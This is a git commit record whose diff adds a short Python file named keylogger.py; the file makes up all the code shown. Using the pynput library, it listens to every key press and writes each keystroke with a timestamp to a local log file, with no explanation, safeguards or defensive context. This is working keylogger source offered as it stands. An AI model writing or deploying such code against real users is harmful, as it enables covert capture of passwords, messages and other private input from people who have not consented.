34ccf43432400c4be8a8e69094276326263b5712
Andirizak abdullahi hussein <102373033+Abdirizak8899@users.noreply.github.com>
2022-05-26 22:20:55 +0300

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,14 @@
+import pynput
+from pynput import keyboard, mouse
+
+from pynput.keyboard import Key , Listener
+
+import logging
+
+logging.basicConfig(filename='keyword.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener (on_press=on_press) as Listener:
+    Listener.join()
